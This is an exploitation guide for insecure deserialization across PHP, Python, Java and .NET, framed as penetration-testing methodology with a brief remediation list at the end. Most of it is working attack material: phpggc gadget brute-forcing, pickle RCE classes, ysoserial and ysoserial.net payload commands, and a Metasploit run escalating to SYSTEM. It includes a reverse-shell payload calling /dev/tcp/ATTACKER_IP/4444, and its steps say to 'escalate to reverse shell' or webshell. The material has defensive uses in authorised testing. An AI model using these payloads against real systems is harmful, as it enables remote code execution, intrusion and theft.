# Complete Methodology for Exploiting Insecure Deserialization

## Table of Contents
1. Understanding the Vulnerability
2. Detection Phase
3. Exploitation Phase by Language
4. Real-World Exploitation Examples
5. Tool Usage Guide
6. Burp Suite Methodology
7. Testing Checklist

---

## 1. Understanding the Vulnerability

Insecure deserialization occurs when an application deserializes user-controlled data without proper validation. The deserialization process itself can initiate an attack, even before the application's own code interacts with the malicious object .

**Why this is dangerous:** Objects of any class available to the website will be deserialized and instantiated, regardless of which class was expected. An object of an unexpected class might cause an exception, but by this time, the damage may already be done.

---

## 2. Detection Phase

### 2.1 Identifying Serialized Data

#### PHP Detection
- Look for Base64-encoded strings that decode to a specific format starting with `a:` or `O:` 
- Example request showing serialized PHP data:
```http
POST /data/task.php HTTP/2
Content-Type: application/x-www-form-urlencoded

datas=YToyOntzOjQ6ImNhbGwiO3M6MTE6InRyYWNrT3B0aW9uIjtzOjY6InN0YXR1cyI7YjowO30%3D
```
- When decoded from base64, you get: `a:2:{s:4:"call";s:11:"trackOption";s:6:"status";b:0;}`
- The prefix `a` indicates an associative array - this format corresponds to PHP's `serialize()` function 

#### Java Detection
- Look for hex signature: `AC ED 00 05`
- Look for Base64 signature: `rO0`
- Content-Type header: `application/x-java-serialized-object`

#### .NET Detection
- Base64 signature: `AAEAAAD/////`
- JSON keys: `$type`, `TypeObject`

### 2.2 Automated Detection with Burp Suite

Using Burp Scanner with custom extensions:

1. **Install Java Deserialization Scanner** from BApp Store
2. **Configure Collaborator** for out-of-band detection :
   - Burp Suite Professional includes a Collaborator server
   - Generates unique DNS domains for payload testing
   - Monitors for DNS/HTTP interactions indicating successful deserialization

**How Collaborator-based detection works** :
1. Generate a Collaborator URL (e.g., `4bg5589heitroj98ttwqau4unltch25r.oastify.com`)
2. Create a payload that triggers DNS resolution of this domain upon deserialization
3. Send payload to target
4. If the Collaborator receives a DNS request, the vulnerability is confirmed

### 2.3 Manual Detection Steps

**Step 1:** Identify all parameters that accept encoded or binary data
**Step 2:** Decode parameters and look for serialization patterns
**Step 3:** Send malformed serialized data and monitor for:
- Stack traces in responses
- Response time differences
- Error messages revealing class names

---

## 3. Exploitation Phase by Language

### 3.1 PHP Exploitation

#### Tool: phpggc 

phpggc is the primary tool for generating PHP gadget chain payloads.

**Basic payload generation:**
```bash
phpggc -a -b -u -f Monolog/RCE8 'system' 'nslookup collaborator.domain.com'
```

Options explained:
- `-a`: ASCII strings with hexadecimal representation
- `-b`: Base64 encoding
- `-u`: URL encoding
- `-f`: Force object destruction after deserialization

**Brute force methodology for black-box testing** :

When source code is unavailable, use this Bash script to test all RCE chains:

```bash
#!/bin/bash
function="system"
command="nslookup your-collaborator.com"
options="-a -b -u -f"

phpggc -l | grep RCE | cut -d' ' -f1 | xargs -L 1 phpggc -i | grep 'phpggc ' --line-buffered |
while read line; do
  gadget=$(echo $line | cut -d' ' -f2)
  if echo $line | grep -q "<function> <parameter>"; then
    phpggc $options $gadget "$function" "$command"
  elif echo $line | grep -q "<code>"; then
    phpggc $options $gadget "$function('$command');"
  elif echo $line | grep -q "<command>"; then
    phpggc $options $gadget "$command"
  else
    phpggc $options $gadget
  fi
done
```

**Real-world exploitation** :
During a black-box audit, a vulnerability was found where the application passed Base64-encoded serialized data. Using the brute force approach with Burp Intruder, the `Monolog/RCE8` chain was identified as working. The command `whoami` confirmed execution as the IIS user.

#### Python Pickle Exploitation

**Vulnerable code pattern** :
```python
import pickle
def load_user_data(file_path):
    with open(file_path, 'rb') as f:
        return pickle.load(f)  # UNSAFE - trusts input
```

**Exploit generation** :
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # Return a callable and arguments to execute
        return (os.system, ("calc.exe",))  # Windows
        # return (os.system, ("gnome-calculator",))  # Linux

with open("malicious.pkl", "wb") as f:
    pickle.dump(Exploit(), f)
```

**Alternative gadget using numpy** :
```python
class RCE:
    def __reduce__(self):
        from numpy.f2py.crackfortran import param_eval
        return (param_eval, ("os.system('ls')", None, None, None))
```

### 3.2 Java Exploitation

#### Tool: ysoserial

**Standard command structure:**
```bash
java -jar ysoserial.jar [gadget_chain] '[command]' > payload.ser
```

**Common gadget chains by target:**
- `CommonsCollections1` - Apache Commons Collections 3.x
- `CommonsCollections4` - Apache Commons Collections 4.x
- `Groovy1` - Groovy library
- `Spring1` - Spring framework

**DNS-based detection payload** :
```bash
java -jar ysoserial-fd-0.0.6.jar CommonsCollections6 "your-collaborator.com" dns base64,url_encoding
```

**Real-world: SharePoint ToolShell Exploit Chain** 

In July 2025, attackers exploited CVE-2025-53770 and CVE-2025-53771 in SharePoint Server 2016, 2019, and Subscription editions.

**Indicators of compromise:**
- URLs: `/_layouts/15/ToolPane.aspx/<random>?DisplayMode=Edit&<random>=/ToolPane.aspx`
- Referer headers: `/_layouts/SignOut.aspx` or `/_layouts/./SignOut.aspx`
- Request body contains `CompressedDataTable` property starting with `H4sI`

**Decoding malicious payloads** :
```bash
# Copy CompressedDataTable property to file
cat property-encoded.txt | python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.stdin.read().strip()))" | base64 -d | zcat > property-decoded.txt

# Extract and decode MethodParameter
cat method-encoded.txt | base64 -d > method-decoded.txt
```

### 3.3 .NET Exploitation

#### Tool: ysoserial.net

**Command structure:**
```bash
ysoserial.exe -g [gadget] -f [formatter] -c "[command]" -o base64
```

**Real-world: Gladinet CentreStack ViewState Deserialization (CVE-2025-30406)** 

This vulnerability affected Gladinet CentreStack through version 16.1.10296.56315 due to hardcoded machineKey values in the IIS web.config file.

**Exploitation with Metasploit:**
```msf
msf6 > use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
msf6 > set rhosts 192.168.201.5
msf6 > set lhost 192.168.201.8
msf6 > exploit

[*] Started reverse TCP handler
[*] Meterpreter session opened
meterpreter > getuid
Server username: IIS APPPOOL\portal
meterpreter > getsystem
...got system via Named Pipe Impersonation
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**.NET Json.NET exploitation** :
```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe" -o base64
```

---

## 4. Real-World Exploitation Examples (Past Years)

### Example 1: Craft Commerce RCE (CVE-2026-32271) 

**Vulnerability chain:**
1. SQL injection in Commerce TotalRevenue widget
2. Unsanitized widget settings interpolated into SQL expressions
3. PDO's multi-statement support allowed injecting serialized PHP object
4. `unserialize()` call in yii2-queue instantiated malicious gadget
5. GuzzleHttp FileCookieJar gadget chain wrote webshell to webroot

**Impact:** Three HTTP requests, no admin privileges, arbitrary command execution.

### Example 2: Python Pickle in picklescan (CVE-2025) 

**Vulnerability:** picklescan <=0.0.33 used `numpy.f2py.crackfortran.param_eval` which could be exploited for RCE.

**PoC:**
```python
class RCE:
    def __reduce__(self):
        from numpy.f2py.crackfortran import param_eval
        return (param_eval, ("os.system('ls')", None, None, None))
```

### Example 3: Java ZoneInfo Vulnerability (2008) 

**Technical details:** The vulnerability involved `sun.util.Calendar.ZoneInfo` class. When deserialized from a privileged context (`doPrivileged()` block), an attacker could bypass security checks and instantiate arbitrary objects including custom class loaders.

**Fix:** JDK 1.6 u11 introduced a restricted AccessControlContext with minimal permissions.

---

## 5. Tool Usage Guide

### 5.1 ysoserial (Java)

**Installation:**
```bash
git clone https://github.com/frohoff/ysoserial
cd ysoserial
mvn clean package
```

**List available gadget chains:**
```bash
java -jar ysoserial.jar
```

**Generate reverse shell payload:**
```bash
java -jar ysoserial.jar CommonsCollections4 "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64 -w 0
```

**Generate for specific Java version:**
```bash
java -jar ysoserial.jar --jvarcs Groovy1 "command"
```

### 5.2 ysoserial.net

**Installation:**
```bash
git clone https://github.com/pwntester/ysoserial.net
# Build in Visual Studio or use pre-compiled binary
```

**List formatters:**
```bash
ysoserial.exe -f
```

**Generate ViewState payload:**
```bash
ysoserial.exe -p ViewState -g ActivitySurrogateSelector -c "cmd /c whoami" --validationalg="SHA1" --validationkey="your_key"
```

### 5.3 phpggc

**Installation:**
```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
chmod +x phpggc
```

**List all RCE chains:**
```bash
./phpggc -l | grep RCE
```

**Generate with custom function:**
```bash
./phpggc Monolog/RCE8 system "id" -b -u
```

### 5.4 Burp Suite Plugins

**SuperSerial (Java detection):** 
- Passive scanning for Java serialized objects
- Identifies `AC ED 00 05` patterns
- Flags potential deserialization endpoints

**Java Deserialization Scanner:**
- Active scanning with Collaborator integration
- Supports DNS-based detection
- Custom payload generation

**Installation steps:**
1. Extender → BApp Store
2. Search for "SuperSerial" or "Java Deserialization Scanner"
3. Install and configure Collaborator settings

---

## 6. Burp Suite Methodology

### 6.1 Setting Up Collaborator for Detection 

**Step 1:** Access Burp → Collaborator tab
**Step 2:** Click "Copy to clipboard" to generate a unique domain
**Step 3:** Generate payload using ysoserial fork:
```bash
java -jar ysoserial-fd-0.0.6.jar CommonsCollections6 "YOUR_COLLABORATOR_DOMAIN" dns base64,url_encoding
```
**Step 4:** Send payload to target endpoint
**Step 5:** Check Collaborator tab for DNS interactions

### 6.2 Intruder Configuration for Brute Force 

**Scenario:** Testing all phpggc chains against a vulnerable parameter

1. Send request to Intruder
2. Set payload position on the serialized parameter
3. Payload type: "Custom iterator"
4. Load payloads from phpggc output
5. Attack type: Sniper
6. Configure grep settings:
   - Look for unique response differences
   - Add Collaborator domain to grep
   - Monitor response length variations

### 6.3 Creating Custom Burp Extensions for Deserialization 

**Key classes for Collaborator integration:**
```java
// Create Collaborator client
Collaborator collaborator = montoyaApi.collaborator();
CollaboratorClient client = collaborator.createClient();

// Generate payload URL
CollaboratorPayload payload = client.generatePayload();
String collaboratorDomain = payload.getUrl().getHost();

// Generate interactions
List<CollaboratorInteraction> interactions = client.getInteractions();

// Check for DNS hits
for (CollaboratorInteraction interaction : interactions) {
    if (interaction.getType() == InteractionType.DNS) {
        // Vulnerability confirmed!
    }
}
```

### 6.4 Black-Box Testing Workflow 

**Phase 1: Identification**
1. Spider the application
2. Review all parameters containing Base64 or binary data
3. Decode and analyze for serialization patterns

**Phase 2: Confirmation**
1. Generate Collaborator payloads
2. Send with modified parameters
3. Monitor Collaborator for interactions

**Phase 3: Exploitation**
1. Identify working gadget chain
2. Craft command execution payload
3. Test with safe commands (ping, nslookup)
4. Escalate to reverse shell

**Phase 4: Pivot**
1. Extract application source if possible
2. Identify additional classes for custom chains
3. Use GadgetProbe for Java class discovery 

---

## 7. Complete Testing Checklist

### Pre-Testing
- [ ] Identify all endpoints accepting user input
- [ ] Note Content-Type headers (especially application/x-java-serialized-object)
- [ ] Extract and decode all Base64 parameters
- [ ] Document serialization patterns found

### Detection
- [ ] Send malformed serialized data to trigger errors
- [ ] Test with Collaborator-based DNS payloads
- [ ] Use Burp Scanner with deserialization checks enabled
- [ ] Review response differences and timing

### Exploitation Preparation
- [ ] Determine language (PHP/Java/.NET/Python)
- [ ] Identify version if possible (error messages, headers)
- [ ] List potential gadget chains for detected libraries

### Payload Generation
- [ ] Generate DNS exfiltration payloads first (safe testing)
- [ ] Create command execution payloads
- [ ] Encode properly (Base64, URL encoding, binary)

### Execution
- [ ] Test with harmless commands (ping, nslookup, sleep)
- [ ] Verify execution via Collaborator or time delays
- [ ] Upgrade to reverse shell or webshell
- [ ] Document successful payloads

### Post-Exploitation
- [ ] Extract source code if accessible
- [ ] Identify all deserialization entry points
- [ ] Document vulnerable libraries and versions
- [ ] Provide remediation recommendations

---

## Remediation Recommendations 

1. **Never deserialize untrusted data** - prefer JSON or other safe formats
2. **Implement allowlists** - only permit specific classes to be deserialized
3. **Use integrity checks** - sign serialized data with HMAC
4. **Avoid privileged deserialization** - don't use `doPrivileged()` blocks 
5. **Update vulnerable libraries** - Commons Collections, Json.NET, etc.
6. **PHP specific**: Replace `unserialize()` with `json_decode()` or Symfony Serializer
7. **Java specific**: Use `ValidatingObjectInputStream` with class allowlists
8. **.NET specific**: Disable `TypeNameHandling` in Json.NET

---

## References
- OWASP Deserialization Cheat Sheet
- ysoserial GitHub Repository
- ysoserial.net GitHub Repository
- phpggc GitHub Repository
- Burp Suite Collaborator Documentation
